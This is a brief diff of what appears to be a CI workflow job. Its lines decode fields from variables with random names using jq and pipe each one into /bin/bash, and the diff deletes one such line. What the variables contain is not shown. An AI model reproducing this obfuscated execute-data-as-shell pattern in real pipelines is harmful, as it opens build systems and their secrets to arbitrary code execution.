@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$unn36" | jq -r .tjqy28 | /bin/bash
           printf '%s' "$snds8" | jq -r .ptnr817 | /bin/bash
           echo $h862 | jq -r .rl4 | /bin/bash
-          echo $oqau891 | jq -r .bvisk8967 | /bin/bash
           echo $jtz2900 | jq -r .sne6313 | /bin/bash
 
       - name: Archive results
